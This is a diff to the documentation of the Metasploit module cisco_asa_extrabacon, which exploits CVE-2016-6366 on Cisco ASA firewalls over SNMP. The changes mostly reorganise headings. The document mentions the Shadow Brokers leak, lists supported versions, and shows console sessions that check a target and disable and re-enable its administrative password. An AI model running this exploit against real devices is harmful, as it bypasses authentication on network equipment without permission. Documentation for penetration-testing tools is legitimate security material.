@@ -1,4 +1,6 @@
-## General notes
+## Vulnerable Application
+
+### General notes
 
 This is using improved shellcode, has less stages than the Equation Group
 version making it more reliable. This makes the SNMP payload packet ~150 less
@@ -10,7 +12,7 @@ finder are available at:
 
 https://github.com/RiskSense-Ops/CVE-2016-6366
 
-## Partial list of supported versions
+### Partial list of supported versions
 ------------------------------------------------------------
 All of the leaked versions are available in the module
 
@@ -54,7 +56,9 @@ All of the leaked versions are available in the module
 
 `*` new version support not part of the original Shadow Brokers leak
 
-`**` We currently can't distinguish between normal and NPE versions from the SNMP strings. We've commented out the NPE offsets, as NPE is very rare (it is for exporting to places where encryption is crappy), but in the future, we'd like to incorporate these versions. Perhaps as a bool option?
+`**` We currently can't distinguish between normal and NPE versions from the SNMP strings. We've commented out the
+NPE offsets, as NPE is very rare (it is for exporting to places where encryption is crappy), but in the future,
+we'd like to incorporate these versions. Perhaps as a bool option?
 
 ## Verification Steps
 
@@ -68,7 +72,11 @@ All of the leaked versions are available in the module
 - `run`
 - ssh admin@x.x.x.x, ensure fake password does not work
 
-## Checking for a vulnerable version
+## Options
+
+## Scenarios
+
+### Checking for a vulnerable version
 
 ```
 msf > use auxiliary/admin/networking/cisco_asa_extrabacon
@@ -80,7 +88,7 @@ msf auxiliary(cisco_asa_extrabacon) > check
 [*] 192.168.1.1:161 The target appears to be vulnerable.
 ```
 
-## Disabling administrative password
+### Disabling administrative password
 
 ```
   msf auxiliary(cisco_asa_extrabacon) > set
@@ -101,7 +109,7 @@ msf auxiliary(cisco_asa_extrabacon) > run
 [*] Auxiliary module execution completed
 ```
 
-## Re-enabling administrative password
+### Re-enabling administrative password
 
 ```
 msf auxiliary(cisco_asa_extrabacon) > set MODE pass-enable
